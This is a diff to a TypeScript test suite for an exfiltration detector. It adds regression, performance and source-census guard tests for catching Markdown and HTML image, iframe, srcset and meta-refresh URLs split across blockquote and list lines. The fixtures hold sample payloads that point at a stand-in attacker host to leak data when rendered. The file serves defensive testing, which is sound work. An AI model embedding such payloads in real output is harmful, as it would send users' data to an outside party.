+  expect(detectExfil(`- <img\n- src="${U}">\n`, []).length).toBeGreaterThan(0);
+  // Inside a fenced code block, same as T89/T90/T91/T92.
+  expect(
+    detectExfil("```\n> <img\n> src=\"" + U + "\">\n```\n", []).length,
+  ).toBeGreaterThan(0);
+});
+
+// COST. The dangerous shape is many constructs sharing one span, which is what
+// bit every earlier round on this file. A megabyte of each newly covered shape
+// must complete well under a second.
+test("T93: the newly covered shapes are linear — megabyte-scale adversarial input completes well under a second", () => {
+  const BUDGET_MS = 900;
+  const U = `https://${ATTACKER}/p.png`;
+  const nested = "> - 1. ".repeat(40); // 280 bytes of alternating markers
+  const shapes: Record<string, string> = {
+    // Family A at scale, and its amplification shape: many opens sharing ONE
+    // description end, so every one of them asks the destination reader about
+    // the identical offset.
+    manyOpensSharingOneWrappedDestination:
+      "![".repeat(200000) + `x](\n${nested}${U})\n`,
+    manyIndependentWrappedDestinations: Array.from(
+      { length: 3500 },
+      () => `> ![a](\n${nested}https://ok.example.org/p.png)\n`,
+    ).join(""),
+    // Families B-E at scale: a megabyte of container-prefixed lines, so the
+    // view is built for the whole document and the HTML pass runs twice.
+    megabyteOfContainerPrefixedLines: `${nested}x\n`.repeat(3500),
+    manyWrappedTags: Array.from(
+      { length: 23000 },
+      () => `> <img\n> src="https://ok.example.org/p.png">\n`,
+    ).join(""),
+    manyWrappedTagsThenAttacker:
+      Array.from(
+        { length: 23000 },
+        () => `> <img\n> src="https://ok.example.org/p.png">\n`,
+      ).join("") + `> <img\n> src="${U}">\n`,
+    // Unterminated tags on container-prefixed lines: the shape that makes a
+    // marker-consuming tag walk quadratic if it is written as a rescan.
+    manyUnterminatedTagsOnMarkerLines: `> <img\n`.repeat(120000),
+  };
+  const slow: string[] = [];
+  const timings: string[] = [];
+  for (const [id, text] of Object.entries(shapes)) {
+    const started = performance.now();
+    const matches = detectExfil(text, []);
+    const elapsed = performance.now() - started;
+    timings.push(`${id}: ${text.length} bytes in ${elapsed.toFixed(1)}ms`);
+    if (elapsed >= BUDGET_MS) slow.push(`${id}=${elapsed.toFixed(1)}ms`);
+    if (id === "manyWrappedTagsThenAttacker") {
+      expect(matches.some((m) => m.value.includes(ATTACKER))).toBe(true);
+    }
+  }
+  console.log("T93 cost measurement:\n" + timings.join("\n"));
+  expect(slow).toEqual([]);
+});
+
+// ---------------------------------------------------------------------------
+// T93 GUARD — the part of this round that outlives it.
+//
+// Four rounds fixed four readers and each declared the class closed. What was
+// missing was never a better fix; it was a way for the invariant to be VISIBLE.
+// "Every reader that crosses a line terminator must consume the block-container
+// marker a renderer repeats on the continuation line" is an invisible rule: it
+// lives in four function comments, and a fifth reader added anywhere in the
+// file joins the class without a single test going red.
+//
+// Two guards make it visible, from opposite directions.
+//
+//   GUARD 1 (source census, below) enumerates every reader in the file FROM THE
+//   SOURCE — every regex literal that can match a line terminator, and every
+//   call site of the three predicates that decide whether a scan may step over
+//   one — and requires each to carry a recorded verdict here. A new reader, an
+//   edited reader, or a reader that changes its line-crossing classification
+//   turns this red. It cannot be satisfied by accident: the registry keys are
+//   the reader's own source text.
+//
+//   GUARD 2 (metamorphic, below) needs no enumeration at all. It asserts the
+//   property the whole class violates: this floor must be AT LEAST AS CAPABLE
+//   on a document as it is on the renderer's own view of that document. A
+//   marker-blind reader breaks it by construction, whether or not anyone
+//   remembered to register it.
+// ---------------------------------------------------------------------------
+
+const EXFIL_SOURCE_PATH =
+  process.env.KERYX_EXFIL_AUDIT_SOURCE ??
+  path.join(path.dirname(fileURLToPath(import.meta.url)), "exfil.ts");
+
+type RegexSite = { name: string | null; source: string; flags: string };
+
+// Walk the module's source, skipping comments and string literals, and return
+// every regex literal with the `const NAME =` it was bound to (or null when it
+// was written inline). Hand-rolled for the same reason `readStartTag` is: a
+// character class cannot tell a regex literal from a division or from a `/`
+// inside a string, and a census that misses a reader is a census that lets the
+// next member of this class in silently.
+function scanRegexLiterals(source: string): {
+  sites: RegexSite[];
+  code: string;
+} {
+  const sites: RegexSite[] = [];
+  let code = "";
+  let index = 0;
+  let lastSignificant = "";
+  while (index < source.length) {
+    const ch = source[index] as string;
+    const next = source[index + 1];
+    if (ch === "/" && next === "/") {
+      while (index < source.length && source[index] !== "\n") index += 1;
+      continue;
+    }
+    if (ch === "/" && next === "*") {
+      index += 2;
+      while (
+        index < source.length &&
+        !(source[index] === "*" && source[index + 1] === "/")
+      ) {
+        index += 1;
+      }
+      index += 2;
+      continue;
+    }
+    if (ch === '"' || ch === "'" || ch === "`") {
+      let at = index + 1;
+      while (at < source.length) {
+        if (source[at] === BS) {
+          at += 2;
+          continue;
+        }
+        if (source[at] === ch) break;
+        at += 1;
+      }
+      code += source.slice(index, at + 1);
+      lastSignificant = ch;
+      index = at + 1;
+      continue;
+    }
+    // A `/` opens a regex literal exactly where an operand may start, i.e. when
+    // the previous significant character cannot END one.
+    if (ch === "/" && !/[A-Za-z0-9_$)\]]/.test(lastSignificant)) {
+      let at = index + 1;
+      let inClass = false;
+      while (at < source.length) {
+        const c = source[at] as string;
+        if (c === BS) {
+          at += 2;
+          continue;
+        }
+        if (c === "[") inClass = true;
+        else if (c === "]") inClass = false;
+        else if (c === "/" && !inClass) break;
+        else if (c === "\n") break;
+        at += 1;
+      }
+      let flagsEnd = at + 1;
+      while (flagsEnd < source.length && /[a-z]/.test(source[flagsEnd] as string)) {
+        flagsEnd += 1;
+      }
+      const name =
+        /const ([A-Z][A-Z0-9_]*)\s*(?::[^=]*)?=\s*$/.exec(code.slice(-200))?.[1] ??
+        null;
+      sites.push({
+        name,
+        source: source.slice(index + 1, at),
+        flags: source.slice(at + 1, flagsEnd),
+      });
+      code += "REGEX";
+      lastSignificant = "X";
+      index = flagsEnd;
+      continue;
+    }
+    if (!/\s/.test(ch)) lastSignificant = ch;
+    code += ch;
+    index += 1;
+  }
+  return { sites, code };
+}
+
+// Can this pattern match a line terminator — i.e. can a span it reads cross
+// one? A NEGATED class counts unless it excludes every terminator LF, CR,
+// U+2028 and U+2029, which is why `[^<>\n]` counts (it can still cross a bare
+// CR) and `[^&#/?\s]` does not (`\s` excludes them all). `.` does not, without
+// the `s` flag.
+function canMatchLineTerminator(pattern: string, flags: string): boolean {
+  const terminatorEscapes = ["\\n", "\\r", "\\u2028", "\\u2029"];
+  let index = 0;
+  let inClass = false;
+  let classBody = "";
+  let negated = false;
+  while (index < pattern.length) {
+    const ch = pattern[index] as string;
+    if (ch === BS) {
+      const token = pattern.slice(index, index + 2);
+      const long = pattern.slice(index, index + 6);
+      const isTerminator =
+        terminatorEscapes.includes(token) || terminatorEscapes.includes(long);
+      if (inClass) classBody += isTerminator ? "T" : token === "\\s" ? "S" : "";
+      else if (token === "\\s" || isTerminator) return true;
+      index += terminatorEscapes.includes(long) ? 6 : 2;
+      continue;
+    }
+    if (!inClass && ch === "[") {
+      inClass = true;
+      negated = pattern[index + 1] === "^";
+      classBody = "";
+      index += negated ? 2 : 1;
+      continue;
+    }
+    if (inClass && ch === "]") {
+      inClass = false;
+      if (negated) {
+        // it can match a terminator unless every one of them is excluded
+        if (!classBody.includes("S") && !classBody.includes("T")) return true;
+        if (!classBody.includes("S")) return true; // `\n` alone leaves CR reachable
+      } else if (classBody.includes("T") || classBody.includes("S")) {
+        return true;
+      }
+      index += 1;
+      continue;
+    }
+    if (inClass) {
+      if (ch === "\n" || ch === "\r") classBody += "T";
+      index += 1;
+      continue;
+    }
+    if (ch === "." && flags.includes("s")) return true;
+    if (ch === "\n" || ch === "\r") return true;
+    index += 1;
+  }
+  return false;
+}
+
+type Verdict =
+  // reads across a line terminator and consumes the repeated marker itself
+  | "consumes-markers"
+  // reads across a line terminator and is covered because the HTML pass is run
+  // a second time over the container-stripped view
+  | "covered-by-stripped-view"
+  // matches a line terminator but reads no SPAN across one: a single-character
+  // predicate, a single-character deletion, or a zero-width assertion
+  | "no-span"
+  // cannot reach a line terminator at all
+  | "cannot-cross";
+
+// EVERY regex literal in the module, with its verdict. `crosses` is what the
+// classifier above must independently derive from the pattern; disagreeing with
+// it is a failure, so editing a pattern to admit a line terminator cannot leave
+// a stale verdict standing.
+const REGEX_READERS: Record<string, { crosses: boolean; verdict: Verdict; why: string }> = {
+  CHARACTER_REFERENCE: {
+    crosses: false,
+    verdict: "cannot-cross",
+    why: "digits, hex digits and ASCII letters only — no element admits a terminator",
+  },
+  URL_STRIPPED_CHARACTERS: {
+    crosses: true,
+    verdict: "no-span",
+    why: "`renderableUrl`'s single-character DELETION of tab/LF/CR; matches one terminator, reads no span across one",
+  },
+  UNICODE_WHITESPACE: {
+    crosses: true,
+    verdict: "no-span",
+    why: "`isCollapsibleSpace`'s above-ASCII predicate, applied to ONE character",
+  },
+  BRACKET_OPEN: {
+    crosses: false,
+    verdict: "cannot-cross",
+    why: "two literal characters, an optional `!` and a `[` — no class, no escape, nothing that admits a terminator",
+  },
+  INLINE_DESTINATION: {
+    crosses: true,
+    verdict: "consumes-markers",
+    why: "T93#A — the leading run is `skipDestinationLeadingWhitespace`, the same helper T90 gave the definition destination; the bare alternative `[^)\\s]+` cannot cross, `[^)]*` is the title span and is never classified, and the angle alternative `[^<>\\n]` ends the destination at LF exactly as CommonMark does",
+  },
+  REFERENCE_DESTINATION: {
+    crosses: true,
+    verdict: "consumes-markers",
+    why: "T90 — same helper, same three sub-arguments; `\\S+` cannot cross",
+  },
+  LABEL_WHITESPACE_RUN: {
+    crosses: true,
+    verdict: "consumes-markers",
+    why: "T91 — runs inside `normaliseLabel` AFTER `stripBlockContainerMarkers` has consumed every repeated marker in the label",
+  },
+  HTML_START_TAG: {
+    crosses: true,
+    verdict: "no-span",
+    why: "the terminator appears only in a zero-width lookahead over ONE character, the tokenizer's tag-name terminator set",
+  },
+  META_REFRESH_CONTENT: {
+    crosses: true,
+    verdict: "covered-by-stripped-view",
+    why: "T93#E — `[\\s\\S]*` crosses the terminator onto the repeated marker; the directive is read again from the container-stripped view",
+  },
+  SENSITIVE_URL_VALUE: {
+    crosses: false,
+    verdict: "cannot-cross",
+    why: "`[^&#/?\\s]+` excludes every whitespace character, terminators included",
+  },
+  SRCSET_DESCRIPTOR: {
+    crosses: true,
+    verdict: "covered-by-stripped-view",
+    why: "T93#D — a candidate's `trim()` crosses the terminator onto the repeated marker; the value is split again from the container-stripped view",
+  },
+};
+
+// EVERY call site of the three predicates that decide whether a scan may step
+// over a line terminator, keyed by its own source line and counted. A new scan
+// loop, or one more copy of an existing one, changes this map.
+const SCAN_SITES: Record<string, { count: number; verdict: Verdict | "definition"; why: string }> = {
+  "function isCollapsibleSpace(code: number, character: string): boolean {": {
+    count: 1,
+    verdict: "definition",
+    why: "the predicate itself",
+  },
+  "function isHtmlSpace(character: string): boolean {": {
+    count: 1,
+    verdict: "definition",
+    why: "the predicate itself",
+  },
+  "if (!isCollapsibleSpace(content.charCodeAt(index), character)) counted += 1;": {
+    count: 1,
+    verdict: "no-span",
+    why: "`indexContent`'s per-character non-whitespace count; reads no span",
+  },
+  "if (lineTerminators && LINE_TERMINATORS.has(content.charCodeAt(index))) {": {
+    count: 1,
+    verdict: "no-span",
+    why: "builds the terminator index the marker-aware readers ask questions of",
+  },
+  "if (LINE_TERMINATORS.has(code)) {": {
+    count: 1,
+    verdict: "consumes-markers",
+    why: "T90 `skipDestinationLeadingWhitespace` — crosses, then calls `skipBlockContainerPrefix`",
+  },
+  "if (isCollapsibleSpace(code, content[at] as string)) {": {
+    count: 1,
+    verdict: "consumes-markers",
+    why: "the same function's non-terminator branch; the terminator branch above consumes the marker",
+  },
+  "if (!LINE_TERMINATORS.has(code)) {": {
+    count: 1,
+    verdict: "consumes-markers",
+    why: "T91 `stripBlockContainerMarkers` — the marker consumer for label text",
+  },
+  "while (at < content.length && !LINE_TERMINATORS.has(content.charCodeAt(at))) {": {
+    count: 2,
+    verdict: "consumes-markers",
+    why: "the two line walks (`readReferenceDefinitions`, `containerStrippedView`); each calls `skipBlockContainerPrefix` at the line start it advances to",
+  },
+  '(isHtmlSpace(content[index] as string) || content[index] === "/")': {
+    count: 1,
+    verdict: "covered-by-stripped-view",
+    why: "T93#B before-attribute-name — crosses onto a repeated `>`, which this reader must go on reading as the tag's own end; read again from the view instead",
+  },
+  "isHtmlSpace(character) ||": {
+    count: 1,
+    verdict: "cannot-cross",
+    why: "the attribute-NAME terminator set: a name ends at a terminator, it never spans one",
+  },
+  "while (cursor < content.length && isHtmlSpace(content[cursor] as string)) {": {
+    count: 2,
+    verdict: "covered-by-stripped-view",
+    why: "T93#B after-attribute-name and before-attribute-value, same argument",
+  },
+  "const close = content.indexOf(quote, valueStart);": {
+    count: 1,
+    verdict: "covered-by-stripped-view",
+    why: "T93#C the quoted attribute VALUE, which crosses a terminator freely",
+  },
+  "!isHtmlSpace(content[valueEnd] as string) &&": {
+    count: 1,
+    verdict: "cannot-cross",
+    why: "an unquoted attribute value ends at a terminator",
+  },
+};
+
+const SCAN_PREDICATES =
+  /isHtmlSpace\(|isCollapsibleSpace\(|LINE_TERMINATORS\.has\(|content\.indexOf\(/;
+
+// GUARD 1. The census must match the registry exactly, in both directions.
+test("T93 GUARD: every reader in exfil.ts that can cross a line terminator carries a recorded verdict", async () => {
+  const source = await readFile(EXFIL_SOURCE_PATH, "utf8");
+  const { sites, code } = scanRegexLiterals(source);
+
+  // (a) every regex literal is a named top-level constant, so the census below
+  // can see it. An inline literal is a reader with no name to register.
+  expect(sites.filter((site) => site.name === null).map((s) => s.source)).toEqual([]);
+
+  // (b) the registry's classification must equal the one derived from the
+  // pattern, so editing a pattern to admit a terminator cannot leave a stale
+  // verdict standing.
+  const derived: Record<string, boolean> = {};
+  for (const site of sites) {
+    derived[site.name as string] = canMatchLineTerminator(site.source, site.flags);
+  }
+  const declared: Record<string, boolean> = {};
+  for (const [name, entry] of Object.entries(REGEX_READERS)) {
+    declared[name] = entry.crosses;
+  }
+  expect(derived).toEqual(declared);
+
+  // (c) every scan site is registered, with the right multiplicity.
+  const found: Record<string, number> = {};
+  for (const line of code.split("\n")) {
+    const key = line.trim();
+    if (key.length === 0 || !SCAN_PREDICATES.test(key)) continue;
+    found[key] = (found[key] ?? 0) + 1;
+  }
+  const registered: Record<string, number> = {};
+  for (const [key, entry] of Object.entries(SCAN_SITES)) {
+    registered[key] = entry.count;
+  }
+  expect(found).toEqual(registered);
+
+  // (d) a verdict is a claim, so it has to say something. Every reader that
+  // CAN cross must claim either that it consumes the marker itself or that the
+  // container-stripped view reads it again.
+  for (const [name, entry] of Object.entries(REGEX_READERS)) {
+    expect(`${name}:${entry.why.length > 30}`).toBe(`${name}:true`);
+    if (entry.crosses && entry.verdict === "cannot-cross") {
+      throw new Error(`${name} can match a line terminator but claims it cannot`);
+    }
+  }
+});
+
+// GUARD 2. The property, with no enumeration: this floor must be at least as
+// capable on a document as on the renderer's own view of it.
+//
+// The corpus is generated, not written: every known-positive template, with a
+// line break plus a repeated blockquote marker inserted at EVERY position in
+// it. That is the shape of every member of this class — T89's definition line,
+// T90's destination, T91's label, T92's second bracket, and T93's inline
+// destination and four HTML readers are all one `"\n> "` inserted at one
+// offset — so a reader that forgets the marker fails here whether or not
+// anyone registered it above.
+test("T93 GUARD: a container-stripped view of a document never finds what the document itself does not", () => {
+  const U = `https://${ATTACKER}/p.png`;
+  const templates = [
+    `![a](${U})`,
+    `![a](<${U}>)`,
+    `[![a](${U})](https://ok.example.org/c)`,
+    `![a][r]\n\n[r]: ${U}`,
+    `![r]\n\n[r]: ${U}`,
+    `<img src="${U}">`,
+    `<img srcset="a.png 1x, ${U} 2x">`,
+    `<iframe src="${U}"></iframe>`,
+    `<video poster="${U}"></video>`,
+    `<base href="${U}">`,
+    `<meta http-equiv="refresh" content="0;url=${U}">`,
+    `<input type="image" src="${U}">`,
+  ];
+  const quote = (text: string): string =>
+    "> " + text.split("\n").join("\n> ");
+  const leaks: string[] = [];
+  let examined = 0;
+  for (const template of templates) {
+    for (let at = 0; at <= template.length; at += 1) {
+      const document = quote(
+        template.slice(0, at) + "\n" + template.slice(at),
+      );
+      const view = containerStrippedView(document);
+      const asRendered = detectExfil(view ? view.text : document, []);
+      if (!asRendered.some((match) => match.value.includes(ATTACKER))) continue;
+      examined += 1;
+      const asWritten = detectExfil(document, []);
+      if (!asWritten.some((match) => match.value.includes(ATTACKER))) {
+        leaks.push(JSON.stringify(document));
+      } else if (applyRedaction(document, asWritten).includes(ATTACKER)) {
+        leaks.push(`unredacted ${JSON.stringify(document)}`);
+      }
+    }
+  }
+  expect(examined).toBeGreaterThan(100); // the corpus must not be vacuous
+  expect(leaks).toEqual([]);
 });
